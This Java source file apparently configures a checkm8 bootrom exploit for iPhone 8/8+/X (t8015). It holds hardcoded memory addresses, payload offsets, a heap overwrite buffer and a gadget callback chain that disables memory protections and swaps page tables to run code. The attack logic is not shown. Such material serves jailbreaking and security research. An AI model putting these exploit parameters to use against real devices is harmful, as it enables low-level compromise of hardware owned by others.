package queen.device;

public class DeviceConfig {
    public static final int PAYLOAD_OFFSET_ARMV7 = 384;
    public static final int PAYLOAD_SIZE_ARMV7   = 320;
    public static final int PAYLOAD_OFFSET_ARM64 = 384;
    public static final int PAYLOAD_SIZE_ARM64   = 576;

    private String version;
    private int cpid;
    private int largeLeak;
    private byte[] overwrite;
    private Long overwriteOffset;
    private int hole;
    private int leak;

    private Long[] usbConstants;
    private Long[] checkm8Constants;

    private long loadWriteGadget;
    private long writeSctlrGadget;
    private long funcGadget;
    private long writeTtbr0;
    private long tlbi;
    private long dcCivac;
    private long dmb;
    private long handleInterfaceRequest;
    
    private long nopGadget;

	private Callback[] callbacks;

    public DeviceConfig(
            String version,
            int cpid,
            int largeLeak,
            byte[] overwrite,
            Long overwriteOffset,
            int hole,
            int leak
    ) {
        assert(overwrite.length <= 0x800);

        this.version = version;
        this.cpid = cpid;
        this.largeLeak = largeLeak;
        this.overwrite = overwrite;
        this.overwriteOffset = overwriteOffset;
        this.hole = hole;
        this.leak = leak;

        switch (cpid) {
            case 0x8015:
                // t8015 - iPhone 8/8+/X
                this.usbConstants = new Long[]{
                        0x18001C000l, // # 1 - LOAD_ADDRESS
                        0x6578656365786563l, // # 2 - EXEC_MAGIC
                        0x646F6E65646F6E65l, // # 3 - DONE_MAGIC
                        0x6D656D636D656D63l, // # 4 - MEMC_MAGIC
                        0x6D656D736D656D73l, // # 5 - MEMS_MAGIC
                        0x10000B9A8l  // # 6 - USB_CORE_DO_IO
                };

                this.checkm8Constants = new Long[]{
                        0x180008528l, // # 1 - gUSBDescriptors
                        0x180003A78l, // # 2 - gUSBSerialNumber
                        0x10000AE80l, // # 3 - usb_create_string_descriptor
                        0x1800008FAl, // # 4 - gUSBSRNMStringDescriptor
                        0x18001BC00l, // # 5 - PAYLOAD_DEST
                        Long.valueOf(PAYLOAD_OFFSET_ARM64), // # 6 - PAYLOAD_OFFSET
                        Long.valueOf(PAYLOAD_SIZE_ARM64), // # 7 - PAYLOAD_SIZE
                        0x180008638l  // # 8 - PAYLOAD_PTR
                };
                
                this.loadWriteGadget = 			0x10000945Cl;
                this.writeSctlrGadget = 		0x1000003ECl;
                this.funcGadget = 				0x10000A9ACl;
                this.writeTtbr0 = 				0x10000045Cl;
                this.tlbi = 					0x1000004ACl;
                this.dcCivac = 					0x1000004D0l;
                this.dmb = 						0x1000004F0l;
                this.handleInterfaceRequest = 	0x10000BCCCl;

                this.callbacks = new Callback[] {
                        new Callback(this.dcCivac, 0x18001C800l),
                        new Callback(this.dcCivac, 0x18001C840l),
                        new Callback(this.dcCivac, 0x18001C880l),
                        new Callback(this.dmb, 0x0l),
                        new Callback(this.writeSctlrGadget, 0x100Dl),
                        new Callback(this.loadWriteGadget, 0x18001C000l),
                        new Callback(this.loadWriteGadget, 0x18001C010l),
                        new Callback(this.writeTtbr0, 0x180020000l),
                        new Callback(this.tlbi, 0x0l),
                        new Callback(this.loadWriteGadget, 0x18001C020l),
                        new Callback(this.writeTtbr0, 0x18000C000l),
                        new Callback(this.tlbi, 0x0l),
                        new Callback(0x18001C800l, 0x0l)
                };
                
                this.nopGadget = 0x10000A9C4l;
        }
    }

    public String getVersion() {
        return this.version;
    }

    public void setVersion(String version) {
        this.version = version;
    }

    public int getCpid() {
        return this.cpid;
    }

    public void setCpid(int cpid) {
        this.cpid = cpid;
    }

    public int getLargeLeak() {
        return this.largeLeak;
    }

    public void setLargeLeak(int largeLeak) {
        this.largeLeak = largeLeak;
    }

    public byte[] getOverwrite() {
        return this.overwrite;
    }

    public void setOverwrite(byte[] overwrite) {
        this.overwrite = overwrite;
    }

    public Long getOverwriteOffset() {
        return this.overwriteOffset;
    }

    public void setOverwriteOffset(Long overwriteOffset) {
        this.overwriteOffset = overwriteOffset;
    }

    public int getHole() {
        return this.hole;
    }

    public void setHole(int hole) {
        this.hole = hole;
    }

    public int getLeak() {
        return this.leak;
    }

    public void setLeak(int leak) {
        this.leak = leak;
    }

    public Long[] getUsbConstants() {
        return this.usbConstants;
    }

    public void setUsbConstants(Long[] usbConstants) {
        this.usbConstants = usbConstants;
    }

    public Long[] getCheckm8Constants() {
        return this.checkm8Constants;
    }

    public void setCheckm8Constants(Long[] checkm8Constants) {
        this.checkm8Constants = checkm8Constants;
    }

    public long getLoadWriteGadget() {
        return this.loadWriteGadget;
    }

    public void setLoadWriteGadget(long loadWriteGadget) {
        this.loadWriteGadget = loadWriteGadget;
    }

    public long getWriteSctlrGadget() {
        return this.writeSctlrGadget;
    }

    public void setWriteSctlrGadget(long writeSctlrGadget) {
        this.writeSctlrGadget = writeSctlrGadget;
    }

    public long getFuncGadget() {
        return this.funcGadget;
    }

    public void setFuncGadget(long funcGadget) {
        this.funcGadget = funcGadget;
    }

    public long getWriteTtbr0() {
        return this.writeTtbr0;
    }

    public void setWriteTtbr0(long writeTtbr0) {
        this.writeTtbr0 = writeTtbr0;
    }

    public long getTlbi() {
        return this.tlbi;
    }

    public void setTlbi(long tlbi) {
        this.tlbi = tlbi;
    }

    public long getDcCivac() {
        return this.dcCivac;
    }

    public void setDcCivac(long dcCivac) {
        this.dcCivac = dcCivac;
    }

    public long getDmb() {
        return this.dmb;
    }

    public void setDmb(long dmb) {
        this.dmb = dmb;
    }

    public long getHandleInterfaceRequest() {
        return this.handleInterfaceRequest;
    }

    public void setHandleInterfaceRequest(long handleInterfaceRequest) {
        this.handleInterfaceRequest = handleInterfaceRequest;
    }

    public Callback[] getCallbacks() {
        return this.callbacks;
    }

    public void setCallbacks(Callback[] callbacks) {
        this.callbacks = callbacks;
    }

    public long getNopGadget() {
		return nopGadget;
	}

	public void setNopGadget(long nopGadget) {
		this.nopGadget = nopGadget;
	}
}
